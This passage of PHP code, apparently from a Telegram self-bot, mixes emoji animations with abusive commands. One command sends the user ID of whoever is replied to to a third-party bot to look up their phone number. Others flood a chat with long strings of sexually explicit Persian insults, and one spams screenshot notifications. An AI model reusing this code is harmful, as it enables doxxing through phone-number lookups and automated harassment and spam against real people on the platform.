                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜        🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜       😕"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜      ☹️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜     😣"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜    😖"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜   😩"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜  🥱"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜 🥱"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😴"]);
                    }
                    if ($text == 'فیشینگ' or $text == 'فیش ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣_______________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣______________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣_____________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣____________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣___________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣__________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣_________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣________💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣_______💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣______💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣_____💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣____💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣___💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣__💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣_💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💵🤑phishing🤑💵"]);
                    }
                    if ($text == ' گل بزن ' or $text == 'فوتبال' or $text == 'توی دروازه') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟          ⚽️🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟         ⚽️ 🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟        ⚽️  🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟       ⚽️   🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟      ⚽️    🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟     ⚽️     🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟    ⚽️      🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟   ⚽️       🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟 ⚽️         🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟⚽️          🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟 ⚽️         🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟  ⚽️        🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟   ⚽️       🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟    ⚽️      🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟     ⚽️     🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟      ⚽️    🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟       ⚽️   🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟        ⚽️  🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟         ⚽️ 🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟          ⚽️🥅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "(توی دروازه🔥)"]);
                    }
                    if ($text == 'برم بخابم') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏                🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏               🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏              🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏             🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏            🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏           🚶🏻‍♂️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏          🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏         🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏        🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏       🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏      🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏     🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏    🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏   🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏  🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏 🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛌"]);
                    }
                    if ($text == 'غرقش کن') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊              🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊             🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊            🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊           🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊          🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊         🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊        🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊       🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊      🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊     🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊    🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊   🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊  🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊 🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "غرق شد🙈"]);
                    }
                    if ($text == 'فضانورد') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀              🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀             🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀            🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀           🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀          🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀         🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀        🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀       🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀      🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀     🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀    🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀   🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀  🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀 🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🇮🇷من میگم ایران قویه🇮🇷"]);
                    }
                    if ($text == 'بزن قدش' or $text == 'ایول') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                    🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                   🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                  🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                 🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻               🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻              🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻             🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻            🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻           🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻          🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻         🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻        🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻       🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻      🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻     🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻    🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻   🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻  🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻🤛🏻"]);
                    }
                    if ($text == 'numberr' or $text == 'شمارتت') {
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to']['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id']['user_id'];
                            $iduser = $messag;
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» درحال جست و جو . . . ! «"]);
                            yield $this->filePutContents("msgid25.txt", $msg_id);
                            yield $this->filePutContents("peer5.txt", "$peer");
                            yield $this->filePutContents("id.txt", "$messag");
                            yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "🔍 جستوجوی شماره 🔎"]);
                            yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "$messag"]);
                        } else {
                            if ($type3 == 'user') {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» درحال جست و جو . . . ! «"]);
                                yield $this->filePutContents("msgid25.txt", $msg_id);
                                yield $this->filePutContents("peer5.txt", "$peer");
                                yield $this->filePutContents("id.txt", "$peer");
                                yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "🔍 جستوجوی شماره 🔎"]);
                                yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "$peer"]);

                            }
                        }
                    }
                    if ($text == "Number") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ' ❶ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 1, 'message' => ' ❷ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 2, 'message' => ' ❸ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 3, 'message' => ' ❹', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 4, 'message' => '❺', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 5, 'message' => '❻', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 6, 'message' => ' ❼', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 7, 'message' => ' ❽ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 8, 'message' => ' ❾ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 9, 'message' => ' ➓ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 10, 'message' => ' پخخخ بای بای فرزندم شات شدی ', 'parse_mode' => 'MarkDown']);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }


                    if ($text == 'شمارش فا' or $text == 'NumberFa') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'بالاباش ببين چطوري مادرتو صلاخي مکينم چصکي موصکي جان خههخهخهخ بي ناموس ممبر واس من قد قد نکن چص ميکنمت بي ناموس واس اربابت شاخ نشو همين لنگه دمپايي رو تو کس مادرت ول ميدم چسکي مادر حوس کردي کير  بکنم تو ما تحت شعاع ناموس گراميت"؟ خخخهه مادرکسه بالاباش ببينم چي بارته تو  الاغ جان بي ناموس خارکسه تو کيرمم ميشيي يا خير؟؟؟خخخخخخخخخخخخخخ مادرکسه کاتکليک ناموس خخخخخخخخخخخخخخ بالاببالاباش.... اين يک فرمان از اربابت ب تو اضحار شد پس لطفا بالاباش']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خخخخخخخخخخخخمادرتو ب 9999 روش پوزيشن گاييدم بوم!خخخخخخخخخخخخخخخ خارتو ب روش فرقوني 9999 بار گاييدم بوم!خخخخخخخخخخخخخخخخخخخخخخ پدرتو ب صلاخي بستم 1 بار کلا بوم!خخخخخخخخخخخخخخخخخخخخخخخخخخخخخ مادرت کسه بالاباش مادرت خره بالاباش اوب مممادر الاغ زاده نفهم کسافت ناموس بي فرهنگ ناموس بدخبت خيلي بي عدبي تو بي ناموس ميفهمي؟']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خارکصه بالا باش']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خخخخخخخخخخخخخخخ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پيتزا تو کص ننتتتتتتتتت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'رلت تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پاره تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'دفتر تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'موس تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'کتاب تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'برنامه تلگرام تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'برنامه بنديکام تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'گوشيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'اين مداد ها تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خودکار تو ک ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'جمجمه تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'قمقمه تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'سيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پنجره تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پارده تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پنکه تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'کيس پيسيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'باطريه گوشيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'جورابام تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'بي ناموس کص ننت شد؟']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خب دیگه باختی برو تو کص ننت شات شدی بایز پسرم']);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }

                    if ($text == 'spam ss' or $text == 'screenspam') {
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }

                    if ($text == 'شمارش ان' or $text == 'NumberEn') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SAG BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR GAV BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KHAR BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KHAZ BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR HEYVUN BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR GORAZ BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KROKODIL BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SHOTOR BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SHOTOR MORGH BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MIKHAY TIZ BEGAMET HALA BEBI KHHKHKHKHK SORAATI NANATO MIKONAM']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'CHIYE KOS MEMBER BABT TAZE BARAT PC KHRIDE BI NAMOS MEMBER?']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'NANE MOKH AZAD NANE SHAM PAYNI NANE AROS MADAR KENTAKI PEDAR HALAZONI KIR MEMBERAK TIZ BASH YALA  TIZZZZZ😂']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'FEK KONAM NANE NANATI NAGAIIDAM KE ENGHAD SHAKHHI????????????????????????????????????HEN NANE GANGANDE PEDAR LASHI']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'to yatimi enghad to pv man daso pa mizani koskesh member man doroste nanato ye zaman mikardam vali toro beh kiramam nemigiram']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KIRAM TU KUNE NNT BALA BASH KIRAM TU DAHANE MADARET BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KHARETO BE GA MIDAM BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
